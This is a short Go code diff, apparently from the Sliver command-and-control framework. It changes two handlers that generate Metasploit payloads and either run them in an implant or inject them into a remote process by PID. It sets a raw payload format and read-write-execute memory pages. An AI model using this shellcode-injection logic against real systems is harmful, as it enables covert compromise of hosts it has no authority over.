@@ -51,6 +51,7 @@ func rpcMsf(req []byte, timeout time.Duration, resp RPCResponse) {
 		LPort:      uint16(msfReq.LPort),
 		Encoder:    msfReq.Encoder,
 		Iterations: int(msfReq.Iterations),
+		Format:     "raw",
 	}
 	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
@@ -59,8 +60,9 @@ func rpcMsf(req []byte, timeout time.Duration, resp RPCResponse) {
 		return
 	}
 	data, _ := proto.Marshal(&sliverpb.Task{
-		Encoder: "raw",
-		Data:    rawPayload,
+		Encoder:  "raw",
+		Data:     rawPayload,
+		RWXPages: true,
 	})
 	data, err = sliver.Request(sliverpb.MsgTask, timeout, data)
 	resp(data, err)
@@ -88,6 +90,7 @@ func rpcMsfInject(req []byte, timeout time.Duration, resp RPCResponse) {
 		LPort:      uint16(msfReq.LPort),
 		Encoder:    msfReq.Encoder,
 		Iterations: int(msfReq.Iterations),
+		Format:     "raw",
 	}
 	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
@@ -96,9 +99,10 @@ func rpcMsfInject(req []byte, timeout time.Duration, resp RPCResponse) {
 		return
 	}
 	data, _ := proto.Marshal(&sliverpb.RemoteTask{
-		Pid:     msfReq.PID,
-		Encoder: "raw",
-		Data:    rawPayload,
+		Pid:      msfReq.PID,
+		Encoder:  "raw",
+		Data:     rawPayload,
+		RWXPages: true,
 	})
 	data, err = sliver.Request(sliverpb.MsgRemoteTask, timeout, data)
 	resp(data, err)
